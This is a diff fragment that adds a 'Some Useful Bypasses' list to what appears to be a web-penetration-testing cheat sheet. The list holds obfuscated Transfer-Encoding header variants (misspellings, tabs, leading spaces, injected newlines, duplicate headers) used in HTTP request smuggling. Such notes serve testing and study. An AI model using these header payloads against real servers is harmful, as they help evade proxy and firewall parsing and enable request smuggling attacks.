@@ -712,6 +712,28 @@ Content-Length: 10
 x=
 ```
 
+## Some Useful Bypasses  
+```
+Transfer-Encoding: xchunked
+
+Transfer-Encoding : chunked
+
+Transfer-Encoding: chunked  
+Transfer-Encoding: x  
+
+Transfer-Encoding:[tab]chunked
+
+[space]Transfer-Encoding: chunked
+
+X: X[\n]Transfer-Encoding: chunked
+
+Transfer-Encoding
+: chunked
+
+Transfer-encoding: identity
+Transfer-encoding: cow
+```
+
 
 # OS command injection
 ## Approach
